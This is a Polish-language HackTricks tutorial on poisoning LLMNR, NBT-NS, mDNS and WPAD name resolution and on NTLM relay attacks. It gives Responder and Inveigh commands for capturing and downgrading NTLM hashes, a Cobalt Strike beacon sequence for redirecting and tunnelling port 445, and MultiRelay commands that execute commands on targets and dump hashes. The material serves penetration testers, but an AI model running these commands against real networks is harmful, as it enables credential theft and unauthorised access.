# Podrobienie LLMNR, NBT-NS, mDNS/DNS i WPAD oraz ataki przekierowania

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytori贸w GitHub.**

</details>

## Protokoy sieciowe

### Protokoy lokalnego rozwizywania nazw
- **LLMNR, NBT-NS i mDNS**:
- Microsoft i inne systemy operacyjne u偶ywaj LLMNR i NBT-NS do lokalnego rozwizywania nazw, gdy DNS zawodzi. Podobnie systemy Apple i Linux u偶ywaj mDNS.
- Te protokoy s podatne na przechwycenie i podrobienie ze wzgldu na ich nieuwierzytelniony, rozgoszeniowy charakter dziaania przez UDP.
- [Responder](https://github.com/lgandx/Responder) mo偶na u偶y do podszywania si pod usugi, wysyajc sfaszowane odpowiedzi do host贸w pytajcych o te protokoy.
- Wicej informacji na temat podszywania si pod usugi za pomoc Responder mo偶na znale藕 [tutaj](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Protok贸 automatycznego odkrywania serwera proxy (WPAD)
- WPAD umo偶liwia przegldarkom automatyczne odkrywanie ustawie serwera proxy.
- Odkrywanie odbywa si za pomoc DHCP, DNS lub w przypadku awarii DNS, za pomoc LLMNR i NBT-NS.
- Responder mo偶e automatyzowa ataki WPAD, kierujc klient贸w do zoliwych serwer贸w WPAD.

### Responder do zatrucia protoko贸w
- **Responder** to narzdzie u偶ywane do zatrucia zapyta LLMNR, NBT-NS i mDNS, selektywnie odpowiadajc na typy zapyta, g贸wnie na usugi SMB.
- Jest on preinstalowany w Kali Linux i mo偶na go skonfigurowa w `/etc/responder/Responder.conf`.
- Responder wywietla przechwycone skr贸ty na ekranie i zapisuje je w katalogu `/usr/share/responder/logs`.
- Obsuguje zar贸wno IPv4, jak i IPv6.
- Wersja Respondera dla systemu Windows jest dostpna [tutaj](https://github.com/lgandx/Responder-Windows).

#### Uruchamianie Respondera
- Aby uruchomi Respondera z domylnymi ustawieniami: `responder -I <Interfejs>`
- Dla bardziej agresywnego sondowania (z potencjalnymi skutkami ubocznymi): `responder -I <Interfejs> -P -r -v`
- Techniki przechwytywania wyzwa/odpowiedzi NTLMv1 dla atwiejszego amania: `responder -I <Interfejs> --lm --disable-ess`
- Podszywanie si pod WPAD mo偶na aktywowa za pomoc: `responder -I <Interfejs> --wpad`
- Zapytania NetBIOS mog by rozwizane na adres IP atakujcego, a proxy uwierzytelniania mo偶e by skonfigurowane: `responder.py -I <interfejs> -Pv`

### Zatrucie DHCP za pomoc Respondera
- Podszywanie odpowiedzi DHCP mo偶e trwale zatruci informacje o trasowaniu ofiary, oferujc bardziej skryt alternatyw dla podszywania ARP.
- Wymaga precyzyjnej wiedzy o konfiguracji sieci docelowej.
- Uruchomienie ataku: `./Responder.py -I eth0 -Pdv`
- Ta metoda skutecznie przechwytuje skr贸ty NTLMv1/2, ale wymaga ostro偶nego postpowania, aby unikn zak贸ce sieciowych.

### Przechwytywanie powiadcze za pomoc Respondera
- Responder podszywa si pod usugi za pomoc wy偶ej wymienionych protoko贸w, przechwytujc powiadczenia (zwykle wyzwanie/odpowied藕 NTLMv2), gdy u偶ytkownik pr贸buje uwierzytelni si wobec podszywanych usug.
- Mo偶na pr贸bowa obni偶y wersj do NetNTLMv1 lub wyczy ESS, aby uatwi amanie powiadcze.

Nale偶y pamita, 偶e stosowanie tych technik powinno odbywa si w spos贸b legalny i etyczny, zapewniajc odpowiednie uprawnienia i unikajc zak贸ce lub nieautoryzowanego dostpu.

## Inveigh

Inveigh to narzdzie dla tester贸w penetracyjnych i zespo贸w czerwonych, przeznaczone dla system贸w Windows. Oferuje funkcje podobne do Respondera, wykonujc ataki podszywania si i man-in-the-middle. Narzdzie ewoluowao z skryptu PowerShell do binarnego pliku C#, z [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) i [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) jako g贸wne wersje. Szczeg贸owe parametry i instrukcje mo偶na znale藕 w [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh mo偶na obsugiwa za pomoc PowerShell:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Lub uruchomiony jako plik binarny C#:
```bash
Inveigh.exe
```
### Atak NTLM Relay

Ten atak wykorzystuje sesje uwierzytelniania SMB do uzyskania dostpu do docelowego komputera, co umo偶liwia uzyskanie powoki systemowej w przypadku powodzenia. Kluczowe wymagania to:
- Uwierzytelniany u偶ytkownik musi mie dostp do lokalnego administratora na hostingu przekazywanym.
- Podpis SMB powinien by wyczony.

#### Przekierowywanie i tunelowanie portu 445

W przypadkach, gdy bezporednie wprowadzenie sieciowe nie jest mo偶liwe, ruch na porcie 445 musi by przekierowany i przeprowadzony tunel. Narzdzia takie jak [**PortBender**](https://github.com/praetorian-inc/PortBender) pomagaj w przekierowywaniu ruchu portu 445 na inny port, co jest niezbdne, gdy dostp do lokalnego administratora jest dostpny do adowania sterownika.

Konfiguracja i dziaanie PortBender w Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Inne narzdzia do ataku NTLM Relay

- **Metasploit**: Skonfigurowany z proxy, lokalnymi i zdalnymi danymi hosta.
- **smbrelayx**: Skrypt Pythona do przekazywania sesji SMB i wykonywania polece lub wdra偶ania tylnych drzwi.
- **MultiRelay**: Narzdzie z pakietu Responder do przekazywania okrelonych u偶ytkownik贸w lub wszystkich u偶ytkownik贸w, wykonywania polece lub wydobywania skr贸t贸w.

Ka偶de narzdzie mo偶na skonfigurowa do dziaania za porednictwem proxy SOCKS, jeli jest to konieczne, umo偶liwiajc ataki nawet przy porednim dostpie do sieci.

### Dziaanie MultiRelay

MultiRelay jest uruchamiany z katalogu _**/usr/share/responder/tools**_, docelowo na okrelone adresy IP lub u偶ytkownik贸w.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
Te narzdzia i techniki tworz kompleksowy zestaw do przeprowadzania atak贸w NTLM Relay w r贸偶nych rodowiskach sieciowych.

### Wymuszanie logowania NTLM

W systemie Windows **mo偶esz pr贸bowa wymusi uwierzytelnianie niekt贸rych uprzywilejowanych kont na dowolnych maszynach**. Przeczytaj nastpujc stron, aby dowiedzie si jak:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## Odwoania
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi trikami hakerskimi, przesyajc PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
